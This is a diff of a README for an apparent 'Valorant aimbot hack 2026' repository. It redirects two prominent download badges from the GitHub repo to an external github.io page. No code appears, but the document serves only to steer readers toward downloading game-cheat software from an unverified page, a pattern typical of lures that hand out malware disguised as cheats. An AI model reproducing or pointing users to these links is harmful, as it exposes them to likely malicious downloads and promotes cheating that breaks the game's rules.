@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD-NOW-red?style=for-the-badge&logo=github&logoColor=white&labelColor=darkred&color=red)](https://github.com/huig066/valorant-aimbot-hack-2026)
+[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD-NOW-red?style=for-the-badge&logo=github&logoColor=white&labelColor=darkred&color=red)](https://huig066.github.io)
 
 </div>
 
@@ -52,7 +52,7 @@ Click the button below to go to the official download page:
 
 <div align="center">
 
-[![Download valorant-aimbot-hack-2026](https://img.shields.io/badge/⬇️_GET_VALORANT_AIMBOT-2026-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=darkblue&color=blue)](https://github.com/huig066/valorant-aimbot-hack-2026)
+[![Download valorant-aimbot-hack-2026](https://img.shields.io/badge/⬇️_GET_VALORANT_AIMBOT-2026-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=darkblue&color=blue)](https://huig066.github.io)
 
 </div>
 
